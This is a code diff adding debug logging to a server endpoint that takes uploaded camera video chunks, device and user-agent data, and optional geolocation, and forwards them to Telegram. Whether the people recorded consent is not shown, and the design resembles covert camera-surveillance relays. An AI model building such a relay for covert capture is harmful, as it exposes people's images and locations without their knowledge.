@@ -280,12 +280,16 @@ app.post("/make-server-039e5f24/telegram/send-photo", async (c) => {
 // Send video to Telegram
 app.post("/make-server-039e5f24/telegram/send-video", async (c) => {
   try {
+    console.log('📹 [Backend] Received video upload request');
+    
     const formData = await c.req.formData();
     const videoFile = formData.get('video') as File;
     const chunkNumber = parseInt(formData.get('chunkNumber') as string);
     const cameraType = formData.get('cameraType') as string;
     const userAgent = formData.get('userAgent') as string;
     const device = formData.get('device') as string;
+    
+    console.log(`📹 [Backend] Video chunk #${chunkNumber}, camera: ${cameraType}, size: ${videoFile?.size} bytes`);
     
     // ✅ Геолокация (опционально)
     const latitude = formData.get('latitude') ? parseFloat(formData.get('latitude') as string) : undefined;
@@ -294,11 +298,15 @@ app.post("/make-server-039e5f24/telegram/send-video", async (c) => {
     const geoTimestamp = formData.get('timestamp') as string | undefined;
     
     if (!videoFile || isNaN(chunkNumber) || !cameraType) {
+      console.error('❌ [Backend] Missing required fields:', { hasVideo: !!videoFile, chunkNumber, cameraType });
       return c.json({ success: false, error: 'Missing video, chunkNumber, or cameraType' }, 400);
     }
     
+    console.log('📹 [Backend] Converting video to blob...');
     const videoBlob = new Blob([await videoFile.arrayBuffer()], { type: videoFile.type });
+    console.log(`📹 [Backend] Blob created, size: ${videoBlob.size} bytes`);
     
+    console.log('📹 [Backend] Sending to Telegram...');
     const success = await telegram.sendVideoToTelegram({
       videoBlob,
       chunkNumber,
